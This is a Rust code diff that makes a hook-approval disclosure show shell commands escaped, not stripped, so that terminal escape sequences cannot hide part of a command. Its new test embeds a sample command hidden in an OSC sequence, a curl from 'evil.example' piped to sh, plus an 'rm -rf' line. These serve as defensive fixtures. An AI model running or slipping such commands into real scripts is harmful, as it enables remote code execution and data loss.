@@ -479,9 +479,12 @@ fn disclosure_body(
     let pin_desc = crate::sanitize::strip_ansi(pin_desc);
     let commit = crate::sanitize::strip_ansi(commit);
     let clone_path = crate::sanitize::strip_ansi(clone_path);
-    let command = crate::sanitize::strip_ansi(command);
-    let declared_override_owned: Option<String> =
-        declared_override.map(crate::sanitize::strip_ansi);
+    // spec: HOOK-199 -- the commands are shown escaped, never stripped: a
+    // stripped escape sequence would hide bytes `sh -c` still runs. A
+    // continuation line is indented to the value column.
+    let show = |c: &str| crate::sanitize::show_command(c, "\n             ");
+    let command = show(command);
+    let declared_override_owned: Option<String> = declared_override.map(show);
     let declared_override = declared_override_owned.as_deref();
     // spec: HOOK-24, HOOK-91 - browse URL is source-derived and must be sanitized.
     let browse_url_owned: Option<String> = browse_url.map(crate::sanitize::strip_ansi);
@@ -1455,6 +1458,43 @@ mod tests {
                 '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}'
             )),
             "disclosure with browse_url must not contain bidi-override code points; got: {text4:?}"
+        );
+    }
+
+    // spec: HOOK-199
+    // An OSC payload is executed by `sh -c` but would be deleted whole by
+    // stripping, hiding the command the user approves. The disclosure shows
+    // every byte, escaped, for the command and for the declared one an
+    // override replaces.
+    #[test]
+    fn disclosure_shows_a_command_hidden_in_an_escape_sequence() {
+        let hidden = "echo ok \x1b]; curl https://evil.example/x | sh #\x07";
+        let text = disclosure_text("s", "main", "abc", "/c", hidden, None, None);
+        assert!(text.contains("curl https://evil.example/x | sh"), "{text}");
+        assert!(text.contains("\\u{1b}]"), "{text}");
+        assert!(text.contains("\\u{7}"), "{text}");
+        assert!(!text.contains('\x1b') && !text.contains('\x07'), "{text:?}");
+
+        let text = hook_disclosure_text(
+            "h",
+            "install",
+            false,
+            "s",
+            "main",
+            "abc",
+            "/c",
+            "make",
+            Some(hidden),
+            None,
+        );
+        assert!(text.contains("curl https://evil.example/x | sh"), "{text}");
+
+        // A multi-line script keeps its lines, continuation indented to the
+        // value column, so a second command cannot read as an argument.
+        let text = disclosure_text("s", "main", "abc", "/c", "true\nrm -rf x", None, None);
+        assert!(
+            text.contains("  Command:   true\n             rm -rf x\n"),
+            "{text}"
         );
     }
 
